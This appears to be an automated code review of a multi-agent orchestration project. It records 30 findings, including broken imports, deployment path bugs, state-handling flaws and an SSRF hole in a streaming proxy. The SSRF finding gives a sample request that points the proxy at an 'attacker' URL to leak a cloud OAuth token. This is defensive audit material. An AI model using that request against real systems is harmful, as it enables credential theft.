# Code review — 2026-05-21

Holistic end-to-end review by an automated reviewer (general-purpose
subagent) after the build reached working-end-to-end cargo-plane Live
mode. 30 findings, grouped by severity. Top-3 CRITICAL items verified
manually before recording. Items that overlap with already-documented
deferrals (`TASK-14`, persona-Live-mode, the 5 architectural
deviations in `docs/adr/`) are deliberately excluded.

## CRITICAL (verified)

### 1. A2UI cost-rollup surface never emits — broken relative import
- **File:** `agents/orchestrator_agent/nodes/finalize.py:198`
- **Issue:** `from .emit import emit_a2ui` — looks for `nodes/emit.py`, which doesn't exist (real module is `agents/orchestrator_agent/events/emit.py`). Raises `ImportError`, swallowed by surrounding `except Exception: pass` (lines 206-209). Result: A2UI cost-rollup never reaches the canvas via the typed path. Canvas works only because of the bespoke `CostRollupBanner.tsx` fallback.
- **Fix:** `from ..events.emit import emit_a2ui`. Remove the broad except. Add a regression test asserting `a2ui_envelopes` lands in `state_delta` on the cargo-plane path.

### 2. SSRF: streaming proxy forwards ADC OAuth token to attacker-controlled URL
- **File:** `canvas/src/app/api/orchestrator/stream/route.ts:88-109`
- **Issue:** `body.streamUrl` (browser-supplied) is fetched server-side with an `Authorization: Bearer <ADC token>` header. No host validation, no allowlist. Any caller can leak the GCP token by posting `{streamUrl:"https://attacker/leak",...}`. Token scope is `cloud-platform`; blast radius = anything the canvas SA can hit.
- **Fix:** Validate against an allowlist regex (`^https://us-central1-aiplatform\.googleapis\.com/v1beta1/projects/<expected>/.+:streamQuery`), or drop the param entirely and read the URL from `NEXT_PUBLIC_ORCHESTRATOR_STREAM_URL` server-side.

### 3. KC drawer A2UI surface references nonexistent schema fields
- **File:** `agents/orchestrator_agent/nodes/equivalence_lookup.py:163-181`
- **Issue:** Reads `candidate_dict.get("aliases", {})`, `manufacturer`, `introduced_year`, `functional_equivalences`. `EquivalentAssetCandidate` (`agents/schemas.py:146-161`) has none of those — only `canonical_id, canonical_label, confidence, rationale_source, rationale_summary, equipment_instance_id, citations`. Drawer renders empty placeholders.
- **Fix:** Either populate from a real KC lookup (the `equivalents` list from `evaluate_direct_availability`) or trim the drawer's required field set to match what the schema delivers.

## HIGH

### 4. Skin / corpus path math will break on the deployed runtime
- **File:** `agents/utils/skin_loader.py:41-42`, `agents/utils/corpus_manifests.py:22-23`
- **Issue:** `_REPO_ROOT = Path(__file__).resolve().parents[2]`. On the Reasoning Engine runtime, `extra_packages` stages flattened dirs; `parents[2]` may not contain `skins/` or `data/anchors/`. Same path-math-after-refactor pattern as the `_SKILLS_DIR` bug fixed in `4bd0e50`. *(Smoke-passes because cargo-plane only uses skin paths in non-critical-path code today; will bite when halliburton skin is exercised in deployed runtime.)*
- **Fix:** Resolve via env var (`SKINS_DIR`, `ANCHORS_DIR`) with sensible defaults, or use `importlib.resources` if skins are structured as a package.

### 5. `CUSTOMER_SKIN` env var not threaded into deploy env
- **File:** `agents/orchestrator_agent/deploy.py:_env_vars` (+ parallel deploys)
- **Issue:** `_env_vars()` doesn't include `CUSTOMER_SKIN`. After `make use-skin SKIN=halliburton && make deploy-orchestrator`, the deployed runtime still reads `default`. Skin substitution is broken on the cloud side without a manual `--env-vars` override.
- **Fix:** Add `"CUSTOMER_SKIN": os.environ.get("CUSTOMER_SKIN", "default")` to every agent's `_env_vars()`.

### 6. Hardcoded GCP project literal in 2 SQL strings
- **File:** `agents/orchestrator_agent/skills/sourcing-logistics/scripts/tools.py:156, 166`
- **Issue:** Interpolates `vertex-ai-demos-468803.oilfield_kc.cross_system_aliases` literally. Any customer deploying into their own project silently fails. The companion `enterprise_data.py:40-47` parameterizes via `_BQ_PROJECT` — these 2 callers missed that pass.
- **Fix:** Use `_BQ_PROJECT` env var.

### 7. `verify_no_json_reads.py` is too narrow — gives false sense of security
- **File:** `scripts/verify_no_json_reads.py:50-55`
- **Issue:** Only matches `agents.utils.synthetic_data` imports. Misses `agents/capacity_planning_agent/skills/scheduling-probability/scripts/tools.py:62-69` which reads `data/start_date_variance/{basin}.json` via `Path().read_text()`. That file isn't in `extra_packages`, so the deployed runtime silently degrades to the static 14d default.
- **Fix:** Either broaden the regex (`read_text|json.load|Path.*\.json`) or remove the legacy-JSON fallback entirely (it can't work on the deployed runtime).

### 8. `iteration_count` never resets across cargo-plane runs in the same session
- **File:** `agents/orchestrator_agent/nodes/routers.py:92-145`
- **Issue:** `PROCEED` leaves `iteration_count` in `ctx.state`. If the canvas reuses a `session_id` across multiple cargo-plane runs (the hardcoded `demo-maria-cargo-plane-v1` does this), the second run starts with iteration_count > 0 and may exhaust early without any revision.
- **Fix:** Reset to 0 in `parse_capacity_gap_request`'s state delta.

### 9. `evaluate_direct_availability` requires FDP approval, masking direct path
- **File:** `agents/orchestrator_agent/nodes/evaluate_availability.py:56`
- **Issue:** `direct_available = chosen is not None and fdp_approved`. If FDP returns no row, always routes equivalence — even when a perfectly good canonical instance exists in-region.
- **Fix:** Treat "FDP absent" as a soft warning blocker, not a precondition.

### 10. Procurement A2A executor leaks raw exception strings
- **File:** `agents/procurement_approval_agent/agent_executor.py:167-172`
- **Issue:** Raw `str(e)` makes it into the A2A response, potentially including query fragments / paths.
- **Fix:** Log with traceback at the executor; surface a sanitized error code over A2A.

### 11. `parallel_system_queries` can hang the canvas on partial failure
- **File:** `agents/orchestrator_agent/nodes/parallel_queries.py:500-516`
- **Issue:** `node.started` fires, then if an in-process query raises the exception propagates unhandled out of `asyncio.gather` (return_exceptions=False) — no `node.completed`, no `node.failed`. Canvas spinner hangs.
- **Fix:** `return_exceptions=True`; emit `NodeFailedEvent` per failure.

## MEDIUM

| # | File | Issue (one line) |
|---|---|---|
| 12 | `services/memory_manager.py:225` (×4) | `VertexAiMemoryBankService` constructed per agent turn — should be module-cached |
| 13 | `nodes/parse_request.py:65` | Deadline hardcoded `2026-05-22T00:00:00` regardless of input; even "by Tuesday" returns Friday |
| 14 | `prompts.py:138-144` + `agent.py:113-126` | `revise_plan` prompt promises `{plan, evaluation, iteration_count}` in node_input but workflow only delivers PlanEvaluation; LLM revises a plan it can't see |
| 15 | `orchestrator_agent/tools.py:168-203` | `get_tools()` is dead code under the Workflow architecture; unused but runs on every import |
| 16 | `services/session_manager.py` (×3) | Dead copy-paste from marathon-planner reference in 3 of 4 agent packages |
| 17 | `nodes/finalize.py:117`, `parallel_queries.py:242…519`, `events/canvas_events.py:41` | `datetime.utcnow()` deprecated; emits naive datetimes |
| 18 | `nodes/parallel_queries.py:388-452` | `asyncio.to_thread` for BQ calls is IO-concurrent only; serializes through the cached BQ client |
| 19 | `nodes/revise_plan.py:48-52` + `sourcing_logistics.py:115-119` | Both callbacks overwrite `ctx.state["plan"]`; original deterministic plan unrecoverable after revision |
| 20 | many | Docstring drift: stale `core/`, `src.`, "Marathon Planner" references after the flatten refactor |
| 21 | `agents/utils/bq_query.py:28-37` | `lru_cache`'d BQ client captures `BQ_PROJECT` at import; stale on monkey-patch |
| 22 | `nodes/parallel_queries.py:500-514` | Gateway-path re-raise short-circuits `node.completed` emission — canvas hang |

## LOW / NIT

| # | File | Issue |
|---|---|---|
| 23 | `procurement_approval_agent/agent_executor.py:95…163` | "simulation review" leftovers from sibling repo |
| 24 | `agents/utils/prompt_builder.py` | PromptBuilder exists, tested, never used by any agent |
| 25 | `procurement_approval_agent/{test_client,local_server}.py` | Dev artifacts shipped to production via `extra_packages` |
| 26 | `canvas/src/app/audit/registry/page.tsx:49` | `useState<DataMode>("mock")` with no setter — should be a const |
| 27 | `nodes/{equivalence_lookup,sourcing_logistics,revise_plan}.py` | Missing `include_contents="none"`; potential context leak across iterations |
| 28 | all agent.py | `instruction=` vs `static_instruction=` inconsistent — only `static_instruction` enables ADK prefix caching |
| 29 | many | `from google.adk import Agent` vs `from google.adk.agents import LlmAgent` — two import styles for same class |
| 30 | docs/adr — implied | Context-cache benefit unrealized while Workflow LLM nodes don't use `static_instruction` |

## Overall assessment

Code quality is **mixed-strong**. The architecture is principled — explicit
Workflow graph, clean schema layer, Memory Bank wired with skin-aware
topics, sensible separation between deterministic data joins and LLM
reasoning. The CLAUDE.md gotchas catalog suggests genuine learning
happened in production.

But there's clear evidence the codebase has been refactored multiple
times under deadline pressure, and the cleanup hasn't always finished.
The strongest themes:

- **Path math after refactors is the dominant correctness risk.** The
  `_SKILLS_DIR` bug fix at `4bd0e50` was not the last instance —
  findings #1, #4, and #6 are the same pattern still live. Combined
  with broad `except Exception: pass` in callbacks, these silently
  degrade rather than fail loud.
- **Live mode security has a real gap.** The proxy SSRF (#2) turns a
  customer engineering review into a hard stop.
- **State management across the Workflow is brittle.** The
  clobber/restore dance between `node_input` and `ctx.state` is
  documented in line-by-line comments — that's a smell. `iteration_count`
  never resets; prompts and payloads disagree; route_on_evaluation_score's
  PROCEED branch collapses two semantically distinct outcomes into one.
- **MCP / A2UI / skin substitution paths exist on paper but won't
  survive a customer trying to actually use them** without code changes
  (hardcoded project, skin env var not threaded, A2UI surfaces emitting
  empty fields, A2UI cost-rollup never emitting at all).

What's strongest: the schema layer (`agents/schemas.py`); the BQ-direct
migration in `enterprise_data.py`; the Plan Evaluator's bounded design;
the canvas-event protocol typed both sides; the deploy patch in
`agents/utils/deploy.py` (exactly the kind of weird-bug-with-a-comment
that future-you will thank present-you for). Test coverage on schemas,
skills, and skin loading is solid.

What's weakest: **zero unit tests on the Workflow nodes themselves** —
every correctness bug in the orchestrator pipeline (parse, route,
build_plan, finalize) lives in code only exercised by the live smoke.
The smoke isn't a substitute for unit tests when the data shapes change
between LLM and function-node boundaries the way they do here.
